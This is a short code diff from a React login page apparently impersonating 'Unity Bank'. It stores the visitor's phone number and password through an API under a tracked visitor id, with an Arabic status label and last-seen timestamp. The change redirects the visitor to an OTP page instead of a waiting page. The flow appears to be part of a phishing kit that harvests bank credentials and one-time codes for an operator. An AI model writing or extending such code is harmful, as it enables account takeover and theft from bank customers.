@@ -123,7 +123,7 @@ export default function LoginPage() {
     setLoading(true);
     const id = localStorage.getItem("unity_id")!;
     await unityApi.patch(id, { phone, password, page: "تسجيل الدخول - مكتمل", lastSeen: Date.now() });
-    setTimeout(() => { window.location.href = "/unity-bank/waiting"; }, 800);
+    setTimeout(() => { window.location.href = "/unity-bank/otp"; }, 800);
   };
 
   return (
